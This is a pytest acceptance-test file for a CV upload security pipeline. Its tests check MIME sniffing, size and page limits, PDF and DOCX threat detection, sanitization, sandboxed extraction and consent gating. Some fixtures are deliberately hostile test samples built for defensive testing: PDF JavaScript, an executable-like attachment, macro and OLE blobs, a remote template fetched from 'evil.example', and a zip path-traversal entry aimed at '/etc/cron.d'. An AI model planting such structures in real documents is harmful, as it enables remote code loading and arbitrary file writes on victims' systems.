"""CV upload security pipeline acceptance tests (whitepaper §11) — before code.

Controls under test: magic-byte MIME sniffing (extension is never trusted),
size and page limits, injectable malware scanner, structural PDF inspection
(encryption, JavaScript, embedded files, open-actions), DOCX inspection
(macros, OLE embeddings, remote templates, zip anomalies), metadata-stripping
sanitization, sandboxed text extraction (timeout + memory), and the consent
gate: nothing is processed before the required consents exist.
"""

from __future__ import annotations

import io
import uuid
import zipfile

import pytest
from pypdf import PdfReader, PdfWriter

from career.db.session import tenant_session
from career.onboarding import consents, upload
from career.storage import FilesystemStorageAdapter

# ── file builders ────────────────────────────────────────────────────────────


def _pdf_with_text(text: str = "Hello CV") -> bytes:
    """A minimal valid single-page PDF with real text (offsets computed)."""
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    stream = f"BT /F1 24 Tf 72 720 Td ({text}) Tj ET".encode()
    objs.append(
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream
        + b"\nendstream"
    )
    out = io.BytesIO()
    out.write(b"%PDF-1.4\n")
    offsets = []
    for i, body in enumerate(objs, start=1):
        offsets.append(out.tell())
        out.write(f"{i} 0 obj\n".encode() + body + b"\nendobj\n")
    xref_at = out.tell()
    out.write(f"xref\n0 {len(objs) + 1}\n".encode())
    out.write(b"0000000000 65535 f \n")
    for off in offsets:
        out.write(f"{off:010d} 00000 n \n".encode())
    out.write(
        f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_at}\n%%EOF".encode()
    )
    return out.getvalue()


def _blank_pdf(pages: int = 1) -> bytes:
    w = PdfWriter()
    for _ in range(pages):
        w.add_blank_page(width=612, height=792)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _pdf_with_javascript() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.add_js("app.alert('pwned');")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _pdf_with_attachment() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.add_attachment("payload.bin", b"MZ\x90\x00evil")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def _encrypted_pdf() -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=612, height=792)
    w.encrypt("secret")
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


_DOCX_CT = (
    '<?xml version="1.0"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="xml" '
    'ContentType="application/vnd.openxmlformats-officedocument'
    '.wordprocessingml.document.main+xml"/></Types>'
)


def _docx(text: str = "Hello DOCX", extra: dict[str, bytes] | None = None) -> bytes:
    doc = (
        '<?xml version="1.0"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/'
        'wordprocessingml/2006/main"><w:body>'
        f"<w:p><w:r><w:t>{text}</w:t></w:r></w:p>"
        "</w:body></w:document>"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _DOCX_CT)
        z.writestr("word/document.xml", doc)
        z.writestr("docProps/core.xml", "<coreProperties>secret author</coreProperties>")
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


class CleanScanner:
    def scan(self, data: bytes) -> str | None:
        return None


class EvilScanner:
    def scan(self, data: bytes) -> str | None:
        return "Eicar-Test-Signature"


LIMITS = upload.Limits(max_bytes=1_000_000, max_pages=5, timeout_s=10.0)


def _validate(data: bytes) -> upload.ScanReport:
    return upload.validate_upload(data, scanner=CleanScanner(), limits=LIMITS)


# ── MIME sniffing: magic bytes, never the extension ──────────────────────────


def test_pdf_and_docx_are_sniffed_by_magic_bytes() -> None:
    assert _validate(_pdf_with_text()).mime == "application/pdf"
    assert _validate(_docx()).mime == (
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    )


def test_exe_bytes_are_rejected_whatever_the_name_says() -> None:
    report = _validate(b"MZ\x90\x00\x03definitely-not-a-cv")
    assert not report.ok
    assert "unrecognized_file_type" in report.findings


def test_plain_zip_is_not_a_docx() -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("random.txt", "hi")
    report = _validate(buf.getvalue())
    assert "unrecognized_file_type" in report.findings


# ── size and page limits ─────────────────────────────────────────────────────


def test_oversize_file_is_rejected_before_parsing() -> None:
    report = _validate(b"%PDF-1.4" + b"\x00" * LIMITS.max_bytes)
    assert "size_exceeds_limit" in report.findings


def test_page_bomb_is_rejected() -> None:
    report = _validate(_blank_pdf(pages=LIMITS.max_pages + 1))
    assert "pdf_page_limit_exceeded" in report.findings


def test_page_count_is_recorded_for_clean_files() -> None:
    report = _validate(_blank_pdf(pages=3))
    assert report.ok
    assert report.page_count == 3


# ── malware scanner is injectable and authoritative ──────────────────────────


def test_scanner_finding_rejects_the_file() -> None:
    report = upload.validate_upload(
        _pdf_with_text(), scanner=EvilScanner(), limits=LIMITS
    )
    assert "malware_detected:Eicar-Test-Signature" in report.findings


# ── structural PDF threats ───────────────────────────────────────────────────


def test_pdf_javascript_is_rejected() -> None:
    report = _validate(_pdf_with_javascript())
    assert any(f.startswith("pdf_javascript") for f in report.findings)


def test_pdf_embedded_files_are_rejected() -> None:
    report = _validate(_pdf_with_attachment())
    assert any(f.startswith("pdf_embedded") for f in report.findings)


def test_encrypted_pdf_is_rejected() -> None:
    report = _validate(_encrypted_pdf())
    assert "pdf_encrypted" in report.findings


# ── structural DOCX threats ──────────────────────────────────────────────────


def test_docx_macros_are_rejected() -> None:
    report = _validate(_docx(extra={"word/vbaProject.bin": b"\xd0\xcf\x11\xe0macros"}))
    assert "docx_macros" in report.findings


def test_docx_ole_embeddings_are_rejected() -> None:
    report = _validate(_docx(extra={"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"}))
    assert "docx_ole_embeddings" in report.findings


def test_docx_remote_template_is_rejected() -> None:
    rels = (
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats'
        '.org/package/2006/relationships"><Relationship Id="rId1" Type="http://'
        "schemas.openxmlformats.org/officeDocument/2006/relationships/"
        'attachedTemplate" Target="http://evil.example/t.dotm" '
        'TargetMode="External"/></Relationships>'
    )
    report = _validate(_docx(extra={"word/_rels/settings.xml.rels": rels}))
    assert "docx_remote_template" in report.findings


def test_docx_zip_anomalies_are_rejected() -> None:
    traversal = _docx(extra={"../../etc/cron.d/evil": b"boom"})
    report = _validate(traversal)
    assert any(f.startswith("zip_anomaly") for f in report.findings)


# ── sanitization strips metadata and active content ──────────────────────────


def test_pdf_sanitization_drops_javascript_attachments_and_metadata() -> None:
    dirty = _pdf_with_javascript()
    clean = upload.sanitize_pdf(dirty)
    r = PdfReader(io.BytesIO(clean))
    root = r.trailer["/Root"]
    names = root.get("/Names")
    assert names is None or (
        "/JavaScript" not in names and "/EmbeddedFiles" not in names
    )
    assert "/OpenAction" not in root
    meta = r.metadata
    assert meta is None or not meta.get("/Author")


def test_docx_sanitization_drops_docprops() -> None:
    clean = upload.sanitize_docx(_docx())
    with zipfile.ZipFile(io.BytesIO(clean)) as z:
        assert not [n for n in z.namelist() if n.startswith("docProps/")]
        assert "word/document.xml" in z.namelist()


# ── sandboxed text extraction ────────────────────────────────────────────────


def test_pdf_text_is_extracted_in_the_sandbox() -> None:
    text = upload.extract_text_sandboxed(_pdf_with_text("Hello CV"), "pdf", LIMITS)
    assert "Hello CV" in text


def test_docx_text_is_extracted_in_the_sandbox() -> None:
    text = upload.extract_text_sandboxed(_docx("خبرة عشر سنوات"), "docx", LIMITS)
    assert "خبرة عشر سنوات" in text


def test_sandbox_kills_a_hung_extractor() -> None:
    with pytest.raises(upload.ExtractionFailed) as err:
        upload._run_sandboxed(
            ["python3", "-c", "import time; time.sleep(30)"],
            b"",
            timeout_s=0.5,
        )
    assert "timeout" in str(err.value)


# ── the end-to-end service: consent gate first, honest row states ────────────


def _grant_required(session, tenant_id: uuid.UUID) -> None:
    for p in consents.REQUIRED_KEYS:
        consents.record_consent(session, tenant_id=tenant_id, purpose=p, action="granted")


def test_processing_refuses_before_consent(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        with pytest.raises(consents.ConsentMissing):
            upload.process_cv_upload(
                s, tenant_id=uuid.UUID(a), data=_pdf_with_text(),
                original_filename="cv.pdf", scanner=CleanScanner(),
                storage=storage, limits=LIMITS,
            )


def test_clean_pdf_is_stored_sanitized_with_extracted_text(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=_pdf_with_text("Hello CV"),
            original_filename="cv.pdf", scanner=CleanScanner(),
            storage=storage, limits=LIMITS,
        )
        assert row.status == "processed"
        assert row.scan_status == "clean"
        assert row.mime_detected == "application/pdf"
        assert row.page_count == 1
        assert row.sha256 and len(row.sha256) == 64
        assert row.document_id is not None
        assert row.extracted_text_storage_key
        text = storage.get(row.extracted_text_storage_key).decode("utf-8")
        assert "Hello CV" in text


def test_malicious_pdf_is_rejected_and_nothing_is_stored(
    two_tenants: tuple[str, str], tmp_path
) -> None:
    a, _ = two_tenants
    tid = uuid.UUID(a)
    storage = FilesystemStorageAdapter(tmp_path)
    with tenant_session(a) as s:
        _grant_required(s, tid)
        row = upload.process_cv_upload(
            s, tenant_id=tid, data=_pdf_with_javascript(),
            original_filename="cv.pdf", scanner=CleanScanner(),
            storage=storage, limits=LIMITS,
        )
        assert row.status == "rejected"
        assert row.scan_status == "rejected"
        assert any(f.startswith("pdf_javascript") for f in row.scan_findings["findings"])
        assert row.document_id is None
        assert row.extracted_text_storage_key is None
